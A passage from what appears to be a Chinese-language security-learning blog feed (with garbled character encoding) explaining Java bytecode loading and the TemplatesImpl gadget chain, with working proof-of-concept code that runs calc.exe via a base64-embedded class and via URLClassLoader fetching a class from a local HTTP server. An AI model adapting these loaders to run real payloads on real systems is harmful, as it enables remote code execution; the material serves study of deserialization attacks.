com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoThree</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(obj,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢è§£é‡Šä¸ºä»€ä¹ˆè¦åå°„ä¿®æ”¹å±æ€§å€¼ã€‚<br><strong>é¦–å…ˆæˆ‘ä»¬æ³¨æ„åˆ°åœ¨<code>TemplatesImp</code>ç±»ä¸­<code>_name</code>ã€<code>__tfactory</code>ã€<code>__bytecodes</code>ä¸‰ä¸ªå±æ€§å€¼éƒ½ä¸ºnullã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250759.png" alt="QQæˆªå›¾20220301221853"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012219267.png" alt="QQæˆªå›¾20220301221915"></p><p>æˆ‘ä»¬è·Ÿç€é“¾å­èµ°ï¼Œé¦–å…ˆæ¥åˆ°ã€‚<code>getTransletInstance()</code></p><h4 id="name"><a href="#name" class="headerlink" title="_name"></a>_name</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250225.png" alt="QQæˆªå›¾20220301220948"></p><p>æ˜¾è€Œæ˜“è§å¦‚æœä¸ºnullåˆ™é€€å‡ºã€‚</p><h4 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250456.png" alt="QQæˆªå›¾20220301221448"></p><p>æ˜¾è€Œæ˜“è§ã€‚</p><p>è¿™é‡Œçš„ä¸€ä¸ªå°ç»†èŠ‚ã€‚ä¸Šé¢æˆªå›¾å·²ç»æ”¾å‡ºã€‚æ˜¯<code>_bytecodes[ ] [ ] </code>ï¼Œè¿™é‡Œå°±éœ€è¦è½¬æ¢ä¸€ä¸‹ã€‚<code>new byte[][]&#123;code&#125;</code></p><h4 id="tfactory"><a href="#tfactory" class="headerlink" title="_tfactory"></a>_tfactory</h4><p>å®ƒå±äº<code>TransformerFactoryImpl</code>ç±»ï¼Œç»™ä¸ª<code>new TransformerFactoryImpl()</code>å°±è¡Œ</p><h4 id="class"><a href="#class" class="headerlink" title=".class"></a>.class</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EivlTwo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EivlTwo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012238593.png" alt="QQæˆªå›¾20220301223850"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250011.png" alt="QQæˆªå›¾20220301223936"></p><p>è¿™é‡Œè¿˜éœ€è¦å°†classæ–‡ä»¶çš„ç±»ç»§æ‰¿<code>AbstractTranslet</code>,ä¸ç„¶ä¼šè¯»å–å­—èŠ‚ç å¤±è´¥ï¼ˆé»˜è®¤å€¼ä¸º-1ï¼Œè¿›å…¥&lt;0ï¼‰ã€‚ä¹Ÿå°±æ˜¯æ— æ³•è·å–base64ä¸­çš„å†…å®¹ã€‚</p><p>ç„¶åå°±æ˜¯è¦è§¦å‘transform()ã€‚<br>å¯¹ç€å®ƒçš„æ„é€ æ¥æ„é€ ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012255411.png" alt="QQæˆªå›¾20220301225539"></p><p>è‡³æ­¤å°±ç»“æŸå•¦ã€‚</p><h3 id="åˆ©ç”¨é“¾2"><a href="#åˆ©ç”¨é“¾2" class="headerlink" title="åˆ©ç”¨é“¾2"></a>åˆ©ç”¨é“¾2</h3><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>ç”±äºè¯¥ç±»çš„<code>getOutputProperties()</code>ä¼šè§¦å‘<code>newTransformer()</code>ï¼Œé‚£ä¹ˆå…¶å®ç±»å‹æ˜¯ä¸€æ ·çš„ã€‚åªéœ€è¦ä¿®æ”¹</p><p> obj.newTransformer();â€”-&gt;obj.getOutputProperties();<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250693.png" alt="QQæˆªå›¾20220301223027"></p><h3 id="åˆ©ç”¨é“¾3"><a href="#åˆ©ç”¨é“¾3" class="headerlink" title="åˆ©ç”¨é“¾3"></a>åˆ©ç”¨é“¾3</h3><p>æ³¨æ„ä¸Šç¯‡å°±è¯´åˆ°</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>)</span>é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</span>ï¼Œè€Œ<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClassé»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¸€ä¸ªé“ç†ï¼š<code>getTransletIndex ()æ–¹æ³•</code>å°±æ˜¯æ²¡åˆå»å®ä¾‹åŒ–è¯¥å¯¹è±¡ã€‚è€Œå…¶ä»–ä¸¤ä¸ªæ–¹æ³•éƒ½æœ‰ã€‚æ‰€ä»¥æ— æ³•è§¦å‘ã€‚</p><p>æ€»ç»“ï¼ˆåªç”¨åˆ°äº†ä¸¤æ¡ã€‚è€Œè¿™ä¸¤æ¡ä¹Ÿå°±åªæ˜¯å¤šäº†ä¸€æ¡å›æº¯è€Œå·²ã€‚ï¼‰</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç </title>
    <link href="/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç "><a href="#JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç " class="headerlink" title="JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç "></a>JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç </h1><p>æœ¬æ–‡å¤§å¤šæ•°å¿˜äº†ï¼Œå› ä¸ºå½“æ—¶å­¦çš„æ—¶å€™å°±æ˜¯ç®€å•äº†è§£ã€‚ç°åœ¨åˆæ˜¯è·Ÿç€ç½‘ä¸Šçš„æ–‡ç« å¤ä¹ äº†ä¸€éã€‚</p><h2 id="Javaå­—èŠ‚ç "><a href="#Javaå­—èŠ‚ç " class="headerlink" title="Javaå­—èŠ‚ç "></a>Javaå­—èŠ‚ç </h2><p><code>Javaå­—èŠ‚ç </code>æŒ‡çš„æ˜¯javaè™šæ‹Ÿæœºä¸­çš„æ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨<code>.class</code>æ–‡ä»¶ä¸­ã€‚javaä¹‹æ‰€ä»¥èƒ½å¤Ÿè¢«ç››è¡Œï¼Œæ— éå°±æ˜¯åœ¨ä¸åŒç³»ç»Ÿä¸­ä¸éœ€è¦ç¿»è¯‘æˆå¯¹åº”çš„0å’Œ1ï¼Œè€Œæ˜¯é—´æ¥çš„ç¿»è¯‘æˆå­—èŠ‚ç ã€‚ç„¶åä¸ç”¨ç³»ç»Ÿä½¿ç”¨jvmè™šæ‹Ÿæœºå°±å¯ä»¥è¿è¡Œã€‚ï¼ˆå½“ç„¶è¿™é‡Œä¹Ÿæœ‰ä¸€äº›æ¡ä»¶ã€‚ï¼‰</p><p><strong>ClassLoaderå¤„ç†å­—èŠ‚ç çš„æµç¨‹ï¼šloadClass -&gt; findClass -&gt; defineClass</strong></p><h2 id="URLClassLoaderè¿œç¨‹åŠ è½½"><a href="#URLClassLoaderè¿œç¨‹åŠ è½½" class="headerlink" title="URLClassLoaderè¿œç¨‹åŠ è½½"></a>URLClassLoaderè¿œç¨‹åŠ è½½</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li>URLæœªä»¥æ–œæ &#x2F;ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ &#x2F;ç»“å°¾ï¼Œä¸”åè®®åæ˜¯fileï¼Œåˆ™ä½¿ç”¨FildLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ &#x2F;ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯fileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±»</li></ul><h4 id="Evilæ¶æ„ç±»"><a href="#Evilæ¶æ„ç±»" class="headerlink" title="Evilæ¶æ„ç±»"></a>Evilæ¶æ„ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Eivl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Eivl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸€ä¸‹ã€‚</p><h4 id="è¿œç¨‹åŠ è½½"><a href="#è¿œç¨‹åŠ è½½" class="headerlink" title="è¿œç¨‹åŠ è½½"></a>è¿œç¨‹åŠ è½½</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DemoOne</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:1234&quot;</span>);<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;url&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>);<br>        aClass.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œç”¨åˆ°çš„<code>loadClass</code>ä½œç”¨ï¼šæ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClassã€‚</strong></p><p><strong><code>findClass</code>ä½œç”¨ï¼šæ ¹æ®URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°ç³»ç»Ÿï¼ŒjaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åå°†å…¶äº¤ç»™defineClassã€‚</strong></p><p>åœ¨å¯¹åº”çš„<code>.class</code>æ–‡ä»¶ä¸‹å¼€å¯å¯¹åº”çš„æœåŠ¡ã€‚ï¼ˆphpstudyã€pythonå‡å¯ï¼‰ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015822.png" alt="QQæˆªå›¾20220301192930"></p><p>è¿è¡Œè¿œç¨‹åŠ è½½ï¼Œæ‰§è¡Œåå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨ã€‚ï¼ˆè¿™é‡Œå°è¯•äº†åŠ <code>\</code>æˆ–è€…ä¸åŠ éƒ½å¯ä»¥å®ç°ã€‚ï¼‰</p><h2 id="ClassLoader-defineClassç›´æ¥åŠ è½½"><a href="#ClassLoader-defineClassç›´æ¥åŠ è½½" class="headerlink" title="ClassLoader#defineClassç›´æ¥åŠ è½½"></a>ClassLoader#defineClassç›´æ¥åŠ è½½</h2><p><strong>è¿™é‡Œæ‰€è¯´çš„<code>denfineClass</code>ä½œç”¨ï¼šç›´æ¥å¤„ç†ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆjavaç±»ã€‚</strong></p><p>è¿™é‡Œå°±è®©æˆ‘æƒ³èµ·åå°„çš„æ—¶å€™<code>Class.forname</code>ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>)</span>é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</span>ï¼Œè€Œ<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClassé»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨è·Ÿä¸€äº›å¤§ä½¬çš„åšå®¢çš„æ—¶å€™ï¼Œå‘ç°è®¸å¤šéƒ½æ˜¯ç”¨base64çš„æ–¹æ³•å»å¤ç°çš„ã€‚ç”¨åˆ°linuxä¸‹çš„å‘½ä»¤ã€‚ï¼ˆå¼ºçƒˆæ¨èä¹°ä¸ªvpsï¼‰ã€‚è®°å¾—åˆ é™¤<code>\n</code>æ¢è¡Œç¬¦ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015420.png" alt="QQæˆªå›¾20220301200451"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br>        <span 